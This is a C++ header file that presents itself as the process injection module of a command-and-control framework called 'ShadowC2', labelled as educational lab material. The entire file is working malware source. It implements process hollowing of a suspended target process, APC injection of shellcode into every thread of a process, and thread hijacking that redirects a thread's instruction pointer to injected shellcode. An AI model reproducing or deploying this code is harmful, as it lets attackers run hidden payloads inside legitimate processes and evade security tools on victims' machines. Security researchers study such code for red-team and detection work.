/**
 * ShadowC2 - Process Injection Module
 * Process Hollowing, APC Injection, Thread Hijacking
 * Laboratorio de Ciberseguridad - Uso Educativo
 */

#pragma once
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <string>

namespace ProcessInjection {

// ============ PROCESS HOLLOWING ============
bool ProcessHollowing(const std::vector<BYTE>& payload, const std::wstring& targetProcess) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // Create suspended process
    if (!CreateProcessW(nullptr, const_cast<LPWSTR>(targetProcess.c_str()), 
                        nullptr, nullptr, FALSE, CREATE_SUSPENDED, 
                        nullptr, nullptr, &si, &pi)) {
        return false;
    }
    
    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // Read PEB to get image base
    PVOID pebImageBase;
    #ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10, &pebImageBase, sizeof(PVOID), nullptr);
    #else
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Ebx + 0x8, &pebImageBase, sizeof(PVOID), nullptr);
    #endif
    
    // Unmap original executable
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, pebImageBase);
    
    // Allocate memory for payload
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);
    
    PVOID newImageBase = VirtualAllocEx(pi.hProcess, pebImageBase, 
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write headers
    WriteProcessMemory(pi.hProcess, newImageBase, payload.data(), 
                       ntHeaders->OptionalHeader.SizeOfHeaders, nullptr);
    
    // Write sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, 
                          (PBYTE)newImageBase + section[i].VirtualAddress,
                          payload.data() + section[i].PointerToRawData,
                          section[i].SizeOfRawData, nullptr);
    }
    
    // Update entry point
    #ifdef _WIN64
    ctx.Rcx = (DWORD64)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10, &newImageBase, sizeof(PVOID), nullptr);
    #else
    ctx.Eax = (DWORD)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Ebx + 0x8, &newImageBase, sizeof(PVOID), nullptr);
    #endif
    
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ============ APC INJECTION ============
bool APCInjection(DWORD pid, const std::vector<BYTE>& shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;
    
    PVOID remoteMem = VirtualAllocEx(hProcess, nullptr, shellcode.size(), 
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return false;
    }
    
    WriteProcessMemory(hProcess, remoteMem, shellcode.data(), shellcode.size(), nullptr);
    
    // Enumerate threads and queue APC
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    return true;
}

// ============ THREAD HIJACKING ============
bool ThreadHijacking(DWORD pid, const std::vector<BYTE>& shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;
    
    PVOID remoteMem = VirtualAllocEx(hProcess, nullptr, shellcode.size(),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteMem, shellcode.data(), shellcode.size(), nullptr);
    
    // Find a thread to hijack
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    HANDLE hThread = nullptr;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    
    if (!hThread) {
        CloseHandle(hProcess);
        return false;
    }
    
    SuspendThread(hThread);
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    #ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
    #else
    ctx.Eip = (DWORD)remoteMem;
    #endif
    
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

} // namespace ProcessInjection
